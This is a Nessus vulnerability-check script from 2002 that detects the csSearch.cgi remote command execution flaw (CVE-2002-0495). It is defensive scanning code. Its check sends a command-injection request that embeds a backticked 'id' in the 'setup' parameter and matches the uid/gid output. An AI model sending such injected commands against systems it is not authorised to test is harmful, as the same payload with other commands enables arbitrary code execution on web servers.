#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

 desc = "The 'csSearch.cgi' CGI is installed. This CGI has
a well known security flaw that lets an attacker execute arbitrary
commands with the privileges of the http daemon (usually root or nobody).

Solution : remove it from /cgi-bin.

Risk factor : High";


if(description)
{
 script_id(10924);
 script_bugtraq_id(4368);
 script_cve_id("CVE-2002-0495");
 script_version ("$Revision: 1.14 $");
 name["english"] = "csSearch.cgi";
 script_name(english:name["english"]);
 
 script_description(english:desc);
 summary["english"] = "Checks for the presence of /cgi-bin/csSearch.cgi";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

http_check_remote_code (
			check_request:"/csSearch.cgi?command=savesetup&setup=print%20`id`",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
